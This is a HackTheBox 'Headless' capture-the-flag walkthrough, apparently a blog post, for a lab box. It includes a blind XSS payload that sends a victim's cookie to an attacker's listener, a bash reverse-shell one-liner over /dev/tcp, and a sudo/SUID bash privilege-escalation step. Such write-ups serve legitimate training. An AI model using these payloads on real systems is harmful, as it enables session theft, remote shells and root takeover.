---
title:  HTB - Headless
description:  HTB - Headless
publishDate: 2024-02-02
tags: 
  - HackTheBox
  - Python Werkzeug
  - XSS
  - User-Agent

---

## Box Info

| Name                  | Headless         | 
| :-------------------- | ---------------: |
| Release Date          | 23 Mar, 2024     |
| OS                    | Linux            |
| Rated Difficulty      | Easy             |

## **Enumeration**

```bash
nmap -A -Pn 10.10.11.8 -oG allPorts
```

![Image](1.png)

- http://10.10.11.8:5000/

![Image](2.png)

## Scan Directory

We dont found anything interesting...

![Image](3.png)

### BurpSuite

Now go to /support

![Image](5.png)

And we try to intercept this with Burpsuite

![Image](4.png)

If I try some HTML injection returns the HTTP request content.

![Image](attemp.png)

The HTTP `response` headers show it’s a `Werkzeug / Python server`

**Exploitation**

**Blind XSS on User-Agent**

Try to figerout a large time i found the XSS over header put in a `header-false: a<script>alert(1)</script>`

`<img src=x onerror=fetch('http://<IP>:<PORT>/'+document.cookie);>`

![Image](6.png)


**Python Server**

`python -m http.server 8020`

![Image](7.png)

![Image](8.png)

After Exploit XSS at User-Agent, we get a reply back with the **admin cookie** at the python server

![Image](9.png)


- http://10.10.11.8:5000/dashboard

![Image](10.png)

![Image](11.png)


**Reverse Shell**

![Image](12.png)

```
#!/bin/bash
/bin/bash -c 'exec bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
#Create Reverse Shell script into a file, In my case I create .sh
```

![Image](13.png)

![Image](14.png)

![Image](15.png)

![Image](16.png)

**User Flag**

## Privilege Escalation

#### Check sudo -l

![Image](17.png)

Syscheck

cat /usr/bin/syscheck:

![Image](18.png)


### Exploit initdb.sh

`echo "chmod u+s /bin/bash" > initdb.sh chmod +x initdb.sh`

- `chmod u+s /bin/bash`: Sets the set-user-ID (SUID) permission on `/bin/bash`, allowing users to execute the bash shell with the file owner's (typically root) privileges.
- `chmod +x initdb.sh`: This command changes the permissions of the file `initdb.sh`, making it executable (`+x`) by the file's owner, group, and others. This allows the script to be run as a program by the user.

![Image](19.png)

```
sudo /usr/bin/syscheck
/bin/bash -p
```

`/bin/bash -p`: starts a bash shell with root privileges retained, due to the SUID bit making the shell run with the file owner's (root's) effective ID.

![Image](20.png)

**Root Flag**